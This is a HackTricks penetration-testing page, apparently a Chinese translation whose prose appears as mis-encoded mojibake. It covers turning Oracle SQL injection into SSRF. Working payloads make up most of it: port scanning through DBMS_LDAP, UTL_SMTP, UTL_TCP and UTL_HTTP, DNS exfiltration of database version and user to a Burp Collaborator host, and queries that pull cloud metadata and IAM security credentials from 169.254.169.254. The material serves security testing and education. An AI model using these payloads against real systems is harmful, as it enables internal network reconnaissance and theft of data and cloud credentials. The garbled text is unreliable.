# Oracle injection

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

**ä¸ºè¿™ç¯‡æ–‡ç« æä¾›ä¸€ä¸ªæ¥è‡ª [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) çš„å·²åˆ é™¤æ–‡ç« çš„æ—¶å…‰æœºå‰¯æœ¬**ã€‚

## SSRF

ä½¿ç”¨ Oracle è¿›è¡Œå¸¦å¤– HTTP å’Œ DNS è¯·æ±‚çš„æ–‡æ¡£éå¸¸é½å…¨ï¼Œä½†ä½œä¸ºåœ¨æ³¨å…¥ä¸­æå– SQL æ•°æ®çš„ä¸€ç§æ‰‹æ®µã€‚æˆ‘ä»¬æ€»æ˜¯å¯ä»¥ä¿®æ”¹è¿™äº›æŠ€æœ¯/å‡½æ•°æ¥æ‰§è¡Œå…¶ä»– SSRF/XSPAã€‚

å®‰è£… Oracle å¯èƒ½éå¸¸ç—›è‹¦ï¼Œç‰¹åˆ«æ˜¯å¦‚æœä½ æƒ³å¿«é€Ÿè®¾ç½®ä¸€ä¸ªå®ä¾‹æ¥å°è¯•å‘½ä»¤ã€‚æˆ‘çš„æœ‹å‹å’ŒåŒäº‹åœ¨ [Appsecco](https://appsecco.com)ï¼Œ[Abhisek Datta](https://github.com/abhisek)ï¼Œå‘æˆ‘æ¨èäº† [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ï¼Œè¿™è®©æˆ‘èƒ½å¤Ÿåœ¨ t2.large AWS Ubuntu æœºå™¨å’Œ Docker ä¸Šè®¾ç½®ä¸€ä¸ªå®ä¾‹ã€‚

æˆ‘ä½¿ç”¨ `--network="host"` æ ‡å¿—è¿è¡Œ docker å‘½ä»¤ï¼Œä»¥ä¾¿åœ¨è¿™ç¯‡åšå®¢æ–‡ç« çš„è¿‡ç¨‹ä¸­æ¨¡æ‹Ÿ Oracle ä½œä¸ºä¸€ä¸ªå…·æœ‰å®Œå…¨ç½‘ç»œè®¿é—®æƒé™çš„æœ¬åœ°å®‰è£…ã€‚
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### æ”¯æŒ URL æˆ–ä¸»æœº/ç«¯å£å·è§„èŒƒçš„ Oracle åŒ… <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

ä¸ºäº†æ‰¾åˆ°æ”¯æŒä¸»æœºå’Œç«¯å£è§„èŒƒçš„ä»»ä½•åŒ…å’Œå‡½æ•°ï¼Œæˆ‘åœ¨ [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html) ä¸Šè¿›è¡Œäº† Google æœç´¢ã€‚å…·ä½“æ¥è¯´ï¼Œ
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
æœç´¢è¿”å›äº†ä»¥ä¸‹ç»“æœï¼ˆå¹¶éæ‰€æœ‰ç»“æœéƒ½å¯ä»¥ç”¨äºæ‰§è¡Œå‡ºç«™ç½‘ç»œï¼‰

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

è¿™ä¸ªç²—ç•¥çš„æœç´¢æ˜¾ç„¶è·³è¿‡äº†åƒ `DBMS_LDAP` è¿™æ ·çš„åŒ…ï¼ˆå®ƒå…è®¸ä¼ é€’ä¸»æœºåå’Œç«¯å£å·ï¼‰ï¼Œå› ä¸º[æ–‡æ¡£é¡µé¢](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)åªæ˜¯å°†æ‚¨æŒ‡å‘[ä¸åŒçš„ä½ç½®](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã€‚å› æ­¤ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–å¯ä»¥è¢«æ»¥ç”¨ä»¥è¿›è¡Œå‡ºç«™è¯·æ±‚çš„OracleåŒ…ï¼Œæˆ‘å¯èƒ½é—æ¼äº†ã€‚

æ— è®ºå¦‚ä½•ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬å‘ç°å¹¶åˆ—å‡ºçš„å…¶ä¸­ä¸€äº›åŒ…ã€‚

**DBMS\_LDAP.INIT**

`DBMS_LDAP` åŒ…å…è®¸è®¿é—®æ¥è‡ªLDAPæœåŠ¡å™¨çš„æ•°æ®ã€‚`init()` å‡½æ•°åˆå§‹åŒ–ä¸LDAPæœåŠ¡å™¨çš„ä¼šè¯ï¼Œå¹¶å°†ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ã€‚

è¿™ä¸ªå‡½æ•°ä¹‹å‰å·²ç»è¢«è®°å½•ä¸‹æ¥ï¼Œä»¥æ˜¾ç¤ºé€šè¿‡DNSçš„æ•°æ®å¤–æ³„ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
ç„¶è€Œï¼Œè€ƒè™‘åˆ°è¯¥å‡½æ•°æ¥å—ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä½¿å…¶åƒç«¯å£æ‰«æå™¨ä¸€æ ·å·¥ä½œã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
ä¸€ä¸ª `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` æ˜¾ç¤ºç«¯å£å…³é—­ï¼Œè€Œä¼šè¯å€¼æŒ‡å‘ç«¯å£ä¸ºå¼€æ”¾ã€‚

**UTL\_SMTP**

`UTL_SMTP` åŒ…ç”¨äºé€šè¿‡ SMTP å‘é€ç”µå­é‚®ä»¶ã€‚ [Oracle æ–‡æ¡£ç½‘ç«™ä¸Šæä¾›çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ­¤åŒ…å‘é€ç”µå­é‚®ä»¶](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478)ã€‚ ç„¶è€Œï¼Œå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æä¾›ä¸»æœºå’Œç«¯å£è§„èŒƒçš„èƒ½åŠ›ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç²—ç•¥çš„ç¤ºä¾‹ï¼Œä½¿ç”¨ `UTL_SMTP.OPEN_CONNECTION` å‡½æ•°ï¼Œè¶…æ—¶ä¸º 2 ç§’ã€‚
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
A `ORA-29276: transfer timeout` è¡¨ç¤ºç«¯å£å¼€æ”¾ä½†æœªå»ºç«‹ SMTP è¿æ¥ï¼Œè€Œ `ORA-29278: SMTP transient error: 421 Service not available` è¡¨ç¤ºç«¯å£å…³é—­ã€‚

**UTL\_TCP**

`UTL_TCP` åŒ…åŠå…¶è¿‡ç¨‹å’Œå‡½æ•°å…è®¸ä¸æœåŠ¡è¿›è¡Œ [åŸºäº TCP/IP çš„é€šä¿¡](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ã€‚å¦‚æœä¸ºç‰¹å®šæœåŠ¡ç¼–ç¨‹ï¼Œè¯¥åŒ…å¯ä»¥è½»æ¾æˆä¸ºè¿›å…¥ç½‘ç»œçš„é€”å¾„æˆ–æ‰§è¡Œå®Œæ•´çš„æœåŠ¡å™¨ç«¯è¯·æ±‚ï¼Œå› ä¸ºå¯ä»¥æ§åˆ¶ TCP/IP è¿æ¥çš„æ‰€æœ‰æ–¹é¢ã€‚

Oracle æ–‡æ¡£ç½‘ç«™ä¸Šçš„ç¤ºä¾‹ [å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ­¤åŒ…å»ºç«‹åŸå§‹ TCP è¿æ¥ä»¥è·å–ç½‘é¡µ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ã€‚æˆ‘ä»¬å¯ä»¥ç¨å¾®ç®€åŒ–ä¸€ä¸‹ï¼Œä½¿ç”¨å®ƒå‘å…ƒæ•°æ®å®ä¾‹æˆ–ä»»æ„ TCP/IP æœåŠ¡å‘å‡ºè¯·æ±‚ã€‚
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
æœ‰è¶£çš„æ˜¯ï¼Œç”±äºèƒ½å¤Ÿæ„é€ åŸå§‹ TCP è¯·æ±‚ï¼Œè¿™ä¸ªåŒ…ä¹Ÿå¯ä»¥ç”¨äºæŸ¥è¯¢æ‰€æœ‰äº‘æä¾›å•†çš„å®ä¾‹å…ƒæ•°æ®æœåŠ¡ï¼Œå› ä¸ºæ–¹æ³•ç±»å‹å’Œé™„åŠ å¤´ä¿¡æ¯éƒ½å¯ä»¥åœ¨ TCP è¯·æ±‚ä¸­ä¼ é€’ã€‚

**UTL\_HTTP å’Œ Web è¯·æ±‚**

ä¹Ÿè®¸åœ¨æ‰€æœ‰çš„ç¦»å¸¦ Oracle SQL æ³¨å…¥æ•™ç¨‹ä¸­ï¼Œæœ€å¸¸è§å’Œå¹¿æ³›è®°å½•çš„æŠ€æœ¯æ˜¯ [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070)ã€‚è¯¥åŒ…åœ¨æ–‡æ¡£ä¸­å®šä¹‰ä¸º - `UTL_HTTP åŒ…ä» SQL å’Œ PL/SQL å‘èµ·è¶…æ–‡æœ¬ä¼ è¾“åè®® (HTTP) è°ƒç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒé€šè¿‡ HTTP è®¿é—®äº’è”ç½‘ä¸Šçš„æ•°æ®ã€‚`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½æ‰§è¡Œä¸€äº›åŸºæœ¬çš„ç«¯å£æ‰«æï¼Œä¾‹å¦‚ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` æˆ– `TNS:operation timed out` æ˜¯ TCP ç«¯å£å…³é—­çš„æ ‡å¿—ï¼Œè€Œ `ORA-29263: HTTP protocol error` æˆ–æ•°æ®åˆ™æ˜¯ç«¯å£å¼€æ”¾çš„æ ‡å¿—ã€‚

æˆ‘è¿‡å»ä½¿ç”¨è¿‡çš„å¦ä¸€ä¸ªåŒ…ï¼ŒæˆåŠŸç‡å„å¼‚ï¼Œæ˜¯ [`HTTPURITYPE` Oracle æŠ½è±¡ç±»å‹çš„ `GETCLOB()` æ–¹æ³•](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705)ï¼Œå®ƒå…è®¸æ‚¨ä¸ URL äº¤äº’å¹¶æ”¯æŒ HTTP åè®®ã€‚`GETCLOB()` æ–¹æ³•ç”¨äºä» URL è·å– GET å“åº”ï¼Œä½œä¸º [CLOB æ•°æ®ç±»å‹ã€‚](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
